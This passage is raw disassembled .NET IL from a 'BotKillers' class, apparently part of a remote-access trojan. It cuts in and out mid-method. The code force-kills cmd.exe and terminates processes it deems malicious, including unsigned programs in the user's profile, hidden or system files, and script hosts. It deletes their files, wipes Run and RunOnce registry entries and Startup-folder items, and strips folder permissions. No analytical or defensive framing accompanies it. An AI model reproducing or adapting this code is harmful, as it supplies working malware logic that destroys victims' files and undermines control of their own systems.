      IL_0019:  ldstr      "TASKKILL /F /IM cmd.exe"
      IL_001e:  ldc.i4.0
      IL_001f:  ldc.i4.0
      IL_0020:  ldc.i4.m1
      IL_0021:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0026:  pop
      IL_0027:  ldc.i4.4
      IL_0028:  stloc.2
      IL_0029:  call       void BotKillers::ScanProcess()
      IL_002e:  ldc.i4.5
      IL_002f:  stloc.2
      IL_0030:  call       void BotKillers::RunStartupKiller()
      IL_0035:  ldc.i4.6
      IL_0036:  stloc.2
      IL_0037:  ldc.i4.0
      IL_0038:  stsfld     int32 BotKillers::ProccessKilled
      IL_003d:  ldc.i4.7
      IL_003e:  stloc.2
      IL_003f:  ldc.i4.0
      IL_0040:  stsfld     int32 BotKillers::Startupkilled
      IL_0045:  leave.s    IL_00b4

      IL_0047:  ldloc.1
      IL_0048:  ldc.i4.1
      IL_0049:  add
      IL_004a:  ldc.i4.0
      IL_004b:  stloc.1
      IL_004c:  switch     ( 
                            IL_0075,
                            IL_0000,
                            IL_0007,
                            IL_0017,
                            IL_0027,
                            IL_002e,
                            IL_0035,
                            IL_003d,
                            IL_0045)
      IL_0075:  leave.s    IL_00a9

      IL_0077:  ldloc.2
      IL_0078:  stloc.1
      IL_0079:  ldloc.0
      IL_007a:  switch     ( 
                            IL_0087,
                            IL_0047)
      IL_0087:  leave.s    IL_00a9

    }  // end .try
    filter
    {
      IL_0089:  isinst     [mscorlib]System.Exception
      IL_008e:  ldnull
      IL_008f:  cgt.un
      IL_0091:  ldloc.0
      IL_0092:  ldc.i4.0
      IL_0093:  cgt.un
      IL_0095:  and
      IL_0096:  ldloc.1
      IL_0097:  ldc.i4.0
      IL_0098:  ceq
      IL_009a:  and
      IL_009b:  endfilter
    }  // end filter
    {  // handler
      IL_009d:  castclass  [mscorlib]System.Exception
      IL_00a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00a7:  leave.s    IL_0077

    }  // end handler
    IL_00a9:  ldc.i4     0x800a0033
    IL_00ae:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_00b3:  throw

    IL_00b4:  ldloc.1
    IL_00b5:  brfalse.s  IL_00bc

    IL_00b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_00bc:  ret
  } // end of method BotKillers::RunStandardBotKiller

  .method public static void  ScanProcess() cil managed
  {
    // Code size       128 (0x80)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process[] V_0,
             string V_1,
             int32 V_2,
             int32 V_3,
             class [System]System.Diagnostics.Process V_4)
    .try
    {
      IL_0000:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcesses()
      IL_0005:  stloc.0
      IL_0006:  ldloc.0
      IL_0007:  ldlen
      IL_0008:  conv.i4
      IL_0009:  ldc.i4.1
      IL_000a:  sub.ovf
      IL_000b:  stloc.2
      IL_000c:  ldc.i4.0
      IL_000d:  stloc.3
      IL_000e:  br.s       IL_006d

      IL_0010:  ldloc.0
      IL_0011:  ldloc.3
      IL_0012:  ldelem.ref
      IL_0013:  stloc.s    V_4
      .try
      {
        IL_0015:  ldloc.s    V_4
        IL_0017:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
        IL_001c:  callvirt   instance string [System]System.Diagnostics.ProcessModule::get_FileName()
        IL_0021:  call       string [mscorlib]System.IO.Path::GetFullPath(string)
        IL_0026:  stloc.1
        IL_0027:  ldloc.1
        IL_0028:  call       bool BotKillers::IsFileMalicious(string)
        IL_002d:  brfalse.s  IL_005b

        IL_002f:  ldloc.s    V_4
        IL_0031:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
        IL_0036:  call       bool BotKillers::WindowIsVisible(string)
        IL_003b:  brtrue.s   IL_005b

        IL_003d:  ldloc.s    V_4
        IL_003f:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
        IL_0044:  call       void BotKillers::TerminateProcess(int32)
        IL_0049:  ldloc.1
        IL_004a:  call       void BotKillers::DestroyFile(string)
        IL_004f:  ldsfld     int32 BotKillers::ProccessKilled
        IL_0054:  ldc.i4.1
        IL_0055:  add.ovf
        IL_0056:  stsfld     int32 BotKillers::ProccessKilled
        IL_005b:  leave.s    IL_0069

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_005d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0062:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0067:  leave.s    IL_0069

      }  // end handler
      IL_0069:  ldloc.3
      IL_006a:  ldc.i4.1
      IL_006b:  add.ovf
      IL_006c:  stloc.3
      IL_006d:  ldloc.3
      IL_006e:  ldloc.2
      IL_006f:  ble.s      IL_0010

      IL_0071:  leave.s    IL_007f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0073:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0078:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_007d:  leave.s    IL_007f

    }  // end handler
    IL_007f:  ret
  } // end of method BotKillers::ScanProcess

  .method public static bool  IsFileMalicious(string fileloc) cil managed
  {
    // Code size       489 (0x1e9)
    .maxstack  3
    .locals init (bool V_0,
             int32 V_1,
             int32 V_2,
             int32 V_3,
             valuetype [mscorlib]System.IO.FileAttributes V_4)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.1
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.3
      IL_0009:  ldarg.0
      IL_000a:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_000f:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0014:  brfalse.s  IL_001f

      IL_0016:  ldc.i4.3
      IL_0017:  stloc.3
      IL_0018:  ldc.i4.0
      IL_0019:  stloc.0
      IL_001a:  br         IL_0125

      IL_001f:  ldc.i4.4
      IL_0020:  stloc.3
      IL_0021:  ldarg.0
      IL_0022:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_0027:  ldstr      "malware"
      IL_002c:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0031:  brfalse.s  IL_003b

      IL_0033:  ldc.i4.5
      IL_0034:  stloc.3
      IL_0035:  ldarg.0
      IL_0036:  call       void BotKillers::DestroyFile(string)
      IL_003b:  ldc.i4.6
      IL_003c:  stloc.3
      IL_003d:  ldarg.0
      IL_003e:  ldstr      "Google.com"
      IL_0043:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0048:  brfalse.s  IL_0053

      IL_004a:  ldc.i4.7
      IL_004b:  stloc.3
      IL_004c:  ldc.i4.0
      IL_004d:  stloc.0
      IL_004e:  br         IL_0125

      IL_0053:  ldc.i4.8
      IL_0054:  stloc.3
      IL_0055:  ldarg.0
      IL_0056:  ldstr      "Microsoft.com"
      IL_005b:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0060:  brfalse.s  IL_006c

      IL_0062:  ldc.i4.s   9
      IL_0064:  stloc.3
      IL_0065:  ldc.i4.0
      IL_0066:  stloc.0
      IL_0067:  br         IL_0125

      IL_006c:  ldc.i4.s   10
      IL_006e:  stloc.3
      IL_006f:  ldarg.0
      IL_0070:  ldstr      "cmd"
      IL_0075:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_007a:  brfalse.s  IL_0086

      IL_007c:  ldc.i4.s   11
      IL_007e:  stloc.3
      IL_007f:  ldc.i4.1
      IL_0080:  stloc.0
      IL_0081:  br         IL_0125

      IL_0086:  ldc.i4.s   12
      IL_0088:  stloc.3
      IL_0089:  ldarg.0
      IL_008a:  ldstr      "wscript"
      IL_008f:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0094:  brfalse.s  IL_00a0

      IL_0096:  ldc.i4.s   13
      IL_0098:  stloc.3
      IL_0099:  ldc.i4.1
      IL_009a:  stloc.0
      IL_009b:  br         IL_0125

      IL_00a0:  ldc.i4.s   14
      IL_00a2:  stloc.3
      IL_00a3:  ldarg.0
      IL_00a4:  call       string [mscorlib]System.Runtime.InteropServices.RuntimeEnvironment::GetRuntimeDirectory()
      IL_00a9:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00ae:  brfalse.s  IL_00b7

      IL_00b0:  ldc.i4.s   15
      IL_00b2:  stloc.3
      IL_00b3:  ldc.i4.1
      IL_00b4:  stloc.0
      IL_00b5:  br.s       IL_0125

      IL_00b7:  ldc.i4.s   16
      IL_00b9:  stloc.3
      IL_00ba:  ldarg.0
      IL_00bb:  call       bool BotKillers/WinTrust::VerifyEmbeddedSignature(string)
      IL_00c0:  brfalse.s  IL_00c9

      IL_00c2:  ldc.i4.s   17
      IL_00c4:  stloc.3
      IL_00c5:  ldc.i4.0
      IL_00c6:  stloc.0
      IL_00c7:  br.s       IL_0125

      IL_00c9:  ldc.i4.s   18
      IL_00cb:  stloc.3
      IL_00cc:  ldarg.0
      IL_00cd:  ldstr      "USERPROFILE"
      IL_00d2:  call       string [mscorlib]System.Environment::GetEnvironmentVariable(string)
      IL_00d7:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00dc:  ldarg.0
      IL_00dd:  ldc.i4.s   35
      IL_00df:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_00e4:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00e9:  or
      IL_00ea:  brfalse.s  IL_00f3

      IL_00ec:  ldc.i4.s   19
      IL_00ee:  stloc.3
      IL_00ef:  ldc.i4.1
      IL_00f0:  stloc.0
      IL_00f1:  br.s       IL_0125

      IL_00f3:  ldc.i4.s   20
      IL_00f5:  stloc.3
      IL_00f6:  ldarg.0
      IL_00f7:  call       valuetype [mscorlib]System.IO.FileAttributes [mscorlib]System.IO.File::GetAttributes(string)
      IL_00fc:  stloc.s    V_4
      IL_00fe:  ldc.i4.s   21
      IL_0100:  stloc.3
      IL_0101:  ldloc.s    V_4
      IL_0103:  ldc.i4.4
      IL_0104:  and
      IL_0105:  ldc.i4.4
      IL_0106:  bne.un.s   IL_010f

      IL_0108:  ldc.i4.s   22
      IL_010a:  stloc.3
      IL_010b:  ldc.i4.1
      IL_010c:  stloc.0
      IL_010d:  br.s       IL_0125

      IL_010f:  ldc.i4.s   23
      IL_0111:  stloc.3
      IL_0112:  ldloc.s    V_4
      IL_0114:  ldc.i4.2
      IL_0115:  and
      IL_0116:  ldc.i4.2
      IL_0117:  bne.un.s   IL_0120

      IL_0119:  ldc.i4.s   24
      IL_011b:  stloc.3
      IL_011c:  ldc.i4.1
      IL_011d:  stloc.0
      IL_011e:  br.s       IL_0125

      IL_0120:  ldc.i4.s   25
      IL_0122:  stloc.3
      IL_0123:  ldc.i4.0
      IL_0124:  stloc.0
      IL_0125:  leave      IL_01df

      IL_012a:  ldloc.2
      IL_012b:  ldc.i4.1
      IL_012c:  add
      IL_012d:  ldc.i4.0
      IL_012e:  stloc.2
      IL_012f:  switch     ( 
                            IL_01a0,
                            IL_0000,
                            IL_0007,
                            IL_0016,
                            IL_001f,
                            IL_0033,
                            IL_003b,
                            IL_004a,
                            IL_0053,
                            IL_0062,
                            IL_006c,
                            IL_007c,
                            IL_0086,
                            IL_0096,
                            IL_00a0,
                            IL_00b0,
                            IL_00b7,
                            IL_00c2,
                            IL_00c9,
                            IL_00ec,
                            IL_00f3,
                            IL_00fe,
                            IL_0108,
                            IL_010f,
                            IL_0119,
                            IL_0120,
                            IL_0125)
      IL_01a0:  leave.s    IL_01d4

      IL_01a2:  ldloc.3
      IL_01a3:  stloc.2
      IL_01a4:  ldloc.1
      IL_01a5:  switch     ( 
                            IL_01b2,
                            IL_012a)
      IL_01b2:  leave.s    IL_01d4

    }  // end .try
    filter
    {
      IL_01b4:  isinst     [mscorlib]System.Exception
      IL_01b9:  ldnull
      IL_01ba:  cgt.un
      IL_01bc:  ldloc.1
      IL_01bd:  ldc.i4.0
      IL_01be:  cgt.un
      IL_01c0:  and
      IL_01c1:  ldloc.2
      IL_01c2:  ldc.i4.0
      IL_01c3:  ceq
      IL_01c5:  and
      IL_01c6:  endfilter
    }  // end filter
    {  // handler
      IL_01c8:  castclass  [mscorlib]System.Exception
      IL_01cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01d2:  leave.s    IL_01a2

    }  // end handler
    IL_01d4:  ldc.i4     0x800a0033
    IL_01d9:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_01de:  throw

    IL_01df:  ldloc.2
    IL_01e0:  brfalse.s  IL_01e7

    IL_01e2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_01e7:  ldloc.0
    IL_01e8:  ret
  } // end of method BotKillers::IsFileMalicious

  .method public static void  KillFile(string location) cil managed
  {
    // Code size       43 (0x2b)
    .maxstack  4
    .locals init (string V_0,
             class [mscorlib]System.Security.AccessControl.DirectorySecurity V_1)
    .try
    {
      IL_0000:  ldarg.0
      IL_0001:  stloc.0
      IL_0002:  ldloc.0
      IL_0003:  newobj     instance void [mscorlib]System.IO.DirectoryInfo::.ctor(string)
      IL_0008:  newobj     instance void [mscorlib]System.Security.AccessControl.DirectorySecurity::.ctor()
      IL_000d:  stloc.1
      IL_000e:  ldloc.1
      IL_000f:  ldc.i4.1
      IL_0010:  ldc.i4.0
      IL_0011:  callvirt   instance void [mscorlib]System.Security.AccessControl.ObjectSecurity::SetAccessRuleProtection(bool,
                                                                                                                         bool)
      IL_0016:  ldloc.1
      IL_0017:  callvirt   instance void [mscorlib]System.IO.DirectoryInfo::SetAccessControl(class [mscorlib]System.Security.AccessControl.DirectorySecurity)
      IL_001c:  leave.s    IL_002a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0023:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0028:  leave.s    IL_002a

    }  // end handler
    IL_002a:  ret
  } // end of method BotKillers::KillFile

  .method public static bool  WindowIsVisible(string WinTitle) cil managed
  {
    // Code size       31 (0x1f)
    .maxstack  2
    .locals init (bool V_0)
    .try
    {
      IL_0000:  ldnull
      IL_0001:  ldarg.0
      IL_0002:  call       native int BotKillers::FindWindow(string,
                                                             string)
      IL_0007:  call       bool BotKillers::IsWindowVisible(native int)
      IL_000c:  stloc.0
      IL_000d:  leave.s    IL_001d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_000f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0014:  ldc.i4.0
      IL_0015:  stloc.0
      IL_0016:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_001b:  leave.s    IL_001d

    }  // end handler
    IL_001d:  ldloc.0
    IL_001e:  ret
  } // end of method BotKillers::WindowIsVisible

  .method public static void  RunStartupKiller() cil managed
  {
    // Code size       458 (0x1ca)
    .maxstack  4
    .locals init (int32 V_0,
             int32 V_1,
             int32 V_2,
             string V_3,
             class [mscorlib]System.Collections.Generic.IEnumerator`1<string> V_4,
             string V_5)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.0
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.2
      IL_0009:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
      IL_000e:  ldc.i4.1
      IL_000f:  call       void BotKillers::StartupFucker(string,
                                                          int32)
      IL_0014:  ldc.i4.3
      IL_0015:  stloc.2
      IL_0016:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\"
      IL_001b:  ldc.i4.1
      IL_001c:  call       void BotKillers::StartupFucker(string,
                                                          int32)
      IL_0021:  ldc.i4.4
      IL_0022:  stloc.2
      IL_0023:  call       bool BotKillers::IsAdmin()
      IL_0028:  brfalse.s  IL_0044

      IL_002a:  ldc.i4.5
      IL_002b:  stloc.2
      IL_002c:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"
      IL_0031:  ldc.i4.2
      IL_0032:  call       void BotKillers::StartupFucker(string,
                                                          int32)
      IL_0037:  ldc.i4.6
      IL_0038:  stloc.2
      IL_0039:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\"
      IL_003e:  ldc.i4.2
      IL_003f:  call       void BotKillers::StartupFucker(string,
                                                          int32)
      IL_0044:  ldc.i4.7
      IL_0045:  stloc.2
      IL_0046:  ldc.i4.7
      IL_0047:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_004c:  ldstr      "\\"
      IL_0051:  ldsfld     string j.OK::RG
      IL_0056:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_005b:  call       string [mscorlib]System.IO.Path::GetFileNameWithoutExtension(string)
      IL_0060:  stloc.3
      IL_0061:  ldc.i4.8
      IL_0062:  stloc.2
      IL_0063:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0068:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_006d:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0072:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_0077:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
      IL_007c:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_Programs()
      IL_0081:  ldstr      "\\Startup"
      IL_0086:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_008b:  callvirt   instance class [mscorlib]System.Collections.ObjectModel.ReadOnlyCollection`1<string> [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::GetFiles(string)
      IL_0090:  callvirt   instance class [mscorlib]System.Collections.Generic.IEnumerator`1<!0> class [mscorlib]System.Collections.ObjectModel.ReadOnlyCollection`1<string>::GetEnumerator()
      IL_0095:  stloc.s    V_4
      IL_0097:  br.s       IL_0111

      IL_0099:  ldloc.s    V_4
      IL_009b:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.IEnumerator`1<string>::get_Current()
      IL_00a0:  stloc.s    V_5
      IL_00a2:  ldc.i4.s   9
      IL_00a4:  stloc.2
      IL_00a5:  ldloc.s    V_5
      IL_00a7:  ldsfld     string j.OK::RG
      IL_00ac:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00b1:  ldc.i4.0
      IL_00b2:  ceq
      IL_00b4:  ldloc.s    V_5
      IL_00b6:  ldloc.3
      IL_00b7:  ldstr      ".url"
      IL_00bc:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00c1:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00c6:  ldc.i4.0
      IL_00c7:  ceq
      IL_00c9:  and
      IL_00ca:  ldloc.s    V_5
      IL_00cc:  ldstr      ".ini"
      IL_00d1:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_00d6:  ldc.i4.0
      IL_00d7:  ceq
      IL_00d9:  and
      IL_00da:  brfalse.s  IL_010e

      IL_00dc:  ldc.i4.s   10
      IL_00de:  stloc.2
      IL_00df:  ldloc.s    V_5
      IL_00e1:  call       void BotKillers::DestroyFile(string)
      IL_00e6:  ldc.i4.s   11
      IL_00e8:  stloc.2
      IL_00e9:  ldc.i4.s   50
      IL_00eb:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_00f0:  ldc.i4.s   12
      IL_00f2:  stloc.2
      IL_00f3:  ldloc.s    V_5
      IL_00f5:  call       void BotKillers::DestroyFile(string)
      IL_00fa:  ldc.i4.s   13
      IL_00fc:  stloc.2
      IL_00fd:  ldc.i4.s   50
      IL_00ff:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0104:  ldc.i4.s   14
      IL_0106:  stloc.2
      IL_0107:  ldloc.s    V_5
      IL_0109:  call       void BotKillers::DestroyFile(string)
      IL_010e:  ldc.i4.s   15
      IL_0110:  stloc.2
      IL_0111:  ldloc.s    V_4
      IL_0113:  callvirt   instance bool [mscorlib]System.Collections.IEnumerator::MoveNext()
      IL_0118:  brtrue     IL_0099

      IL_011d:  ldc.i4.s   16
      IL_011f:  stloc.2
      IL_0120:  ldloc.s    V_4
      IL_0122:  brfalse.s  IL_012b

      IL_0124:  ldloc.s    V_4
      IL_0126:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_012b:  leave      IL_01c1

      IL_0130:  ldloc.1
      IL_0131:  ldc.i4.1
      IL_0132:  add
      IL_0133:  ldc.i4.0
      IL_0134:  stloc.1
      IL_0135:  switch     ( 
                            IL_0182,
                            IL_0000,
                            IL_0007,
                            IL_0014,
                            IL_0021,
                            IL_002a,
                            IL_0037,
                            IL_0044,
                            IL_0061,
                            IL_00a2,
                            IL_00dc,
                            IL_00e6,
                            IL_00f0,
                            IL_00fa,
                            IL_0104,
                            IL_010e,
                            IL_011d,
                            IL_012b)
      IL_0182:  leave.s    IL_01b6

      IL_0184:  ldloc.2
      IL_0185:  stloc.1
      IL_0186:  ldloc.0
      IL_0187:  switch     ( 
                            IL_0194,
                            IL_0130)
      IL_0194:  leave.s    IL_01b6

    }  // end .try
    filter
    {
      IL_0196:  isinst     [mscorlib]System.Exception
      IL_019b:  ldnull
      IL_019c:  cgt.un
      IL_019e:  ldloc.0
      IL_019f:  ldc.i4.0
      IL_01a0:  cgt.un
      IL_01a2:  and
      IL_01a3:  ldloc.1
      IL_01a4:  ldc.i4.0
      IL_01a5:  ceq
      IL_01a7:  and
      IL_01a8:  endfilter
    }  // end filter
    {  // handler
      IL_01aa:  castclass  [mscorlib]System.Exception
      IL_01af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b4:  leave.s    IL_0184

    }  // end handler
    IL_01b6:  ldc.i4     0x800a0033
    IL_01bb:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_01c0:  throw

    IL_01c1:  ldloc.1
    IL_01c2:  brfalse.s  IL_01c9

    IL_01c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_01c9:  ret
  } // end of method BotKillers::RunStartupKiller

  .method public static void  StartupFucker(string regkey,
                                            int32 'type') cil managed
  {
    // Code size       273 (0x111)
    .maxstack  5
    .locals init (class [mscorlib]Microsoft.Win32.RegistryKey V_0,
             string[] V_1,
             int32 V_2,
             string V_3,
             string V_4)
    .try
    {
      IL_0000:  ldarg.1
      IL_0001:  ldc.i4.1
      IL_0002:  bne.un.s   IL_0010

      IL_0004:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
      IL_0009:  ldarg.0
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_000f:  stloc.0
      IL_0010:  ldarg.1
      IL_0011:  ldc.i4.2
      IL_0012:  bne.un.s   IL_0020

      IL_0014:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::LocalMachine
      IL_0019:  ldarg.0
      IL_001a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_001f:  stloc.0
      IL_0020:  ldloc.0
      IL_0021:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_0026:  stloc.1
      IL_0027:  ldc.i4.0
      IL_0028:  stloc.2
      IL_0029:  br         IL_00f9

      IL_002e:  ldloc.1
      IL_002f:  ldloc.2
      IL_0030:  ldelem.ref
      IL_0031:  stloc.3
      .try
      {
        IL_0032:  ldloc.0
        IL_0033:  ldloc.3
        IL_0034:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string)
        IL_0039:  callvirt   instance string [mscorlib]System.Object::ToString()
        IL_003e:  stloc.s    V_4
        IL_0040:  ldloc.s    V_4
        IL_0042:  ldstr      "-"
        IL_0047:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_004c:  brfalse.s  IL_008f

        IL_004e:  ldloc.s    V_4
        IL_0050:  ldstr      "\""
        IL_0055:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_005a:  brfalse.s  IL_006e

        IL_005c:  ldloc.s    V_4
        IL_005e:  ldstr      "\""
        IL_0063:  ldsfld     string [mscorlib]System.String::Empty
        IL_0068:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                              string)
        IL_006d:  pop
        IL_006e:  nop
        .try
        {
          IL_006f:  ldloc.s    V_4
          IL_0071:  ldstr      " -"
          IL_0076:  ldc.i4.m1
          IL_0077:  ldc.i4.0
          IL_0078:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                    string,
                                                                                                    int32,
                                                                                                    valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
          IL_007d:  ldc.i4.0
          IL_007e:  ldelem.ref
          IL_007f:  stloc.s    V_4
          IL_0081:  leave.s    IL_008f

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0083:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0088:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_008d:  leave.s    IL_008f

        }  // end handler
        IL_008f:  ldloc.s    V_4
        IL_0091:  ldstr      "\""
        IL_0096:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_009b:  brfalse.s  IL_00b8

        IL_009d:  ldloc.s    V_4
        IL_009f:  ldc.i4.1
        IL_00a0:  newarr     [mscorlib]System.Char
        IL_00a5:  dup
        IL_00a6:  ldc.i4.0
        IL_00a7:  ldc.i4.s   34
        IL_00a9:  stelem.i2
        IL_00aa:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
        IL_00af:  ldc.i4.1
        IL_00b0:  ldelem.ref
        IL_00b1:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
        IL_00b6:  stloc.s    V_4
        IL_00b8:  ldloc.s    V_4
        IL_00ba:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_00bf:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_00c4:  brtrue.s   IL_00e7

        IL_00c6:  ldarg.1
        IL_00c7:  ldloc.3
        IL_00c8:  ldarg.0
        IL_00c9:  ldloc.s    V_4
        IL_00cb:  call       void BotKillers::RemoveKey(int32,
                                                        string,
                                                        string,
                                                        string)
        IL_00d0:  ldloc.s    V_4
        IL_00d2:  call       bool BotKillers/WinTrust::VerifyEmbeddedSignature(string)
        IL_00d7:  brtrue.s   IL_00e7

        IL_00d9:  ldloc.s    V_4
        IL_00db:  call       void BotKillers::TerminateProcessPath(string)
        IL_00e0:  ldloc.s    V_4
        IL_00e2:  call       void BotKillers::DestroyFile(string)
        IL_00e7:  leave.s    IL_00f5

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00e9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00ee:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00f3:  leave.s    IL_00f5

      }  // end handler
      IL_00f5:  ldloc.2
      IL_00f6:  ldc.i4.1
      IL_00f7:  add.ovf
      IL_00f8:  stloc.2
      IL_00f9:  ldloc.2
      IL_00fa:  ldloc.1
      IL_00fb:  ldlen
      IL_00fc:  conv.i4
      IL_00fd:  blt        IL_002e

      IL_0102:  leave.s    IL_0110

    }  // end .try
    catch [mscorlib]System.Exception 
    {
